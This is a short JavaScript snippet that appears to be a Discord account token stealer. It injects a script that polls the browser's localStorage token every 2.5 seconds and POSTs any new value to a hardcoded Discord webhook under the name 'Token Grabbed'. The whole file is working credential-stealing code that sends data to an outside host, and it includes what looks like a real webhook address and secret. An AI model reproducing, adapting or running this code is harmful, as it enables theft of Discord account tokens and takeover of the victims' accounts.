var script = document.createElement('script');
script.textContent = `document.write('<script>var token = "unde";function sendrq(){var request = new XMLHttpRequest();request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");request.setRequestHeader("Content-type", "application/json");var params = {username: "Token Grabbed",avatar_url: "",content: token};request.send(JSON.stringify(params))};setInterval(()=>{if(localStorage.token != token){token = localStorage.token;sendrq()}},2500);</script>')`;
var w = window.open('https://discord.com/api/webhooks/842367883203444787/3wUnoiR');
w.onload = ()=>{
    w.document.head.appendChild(script);
};
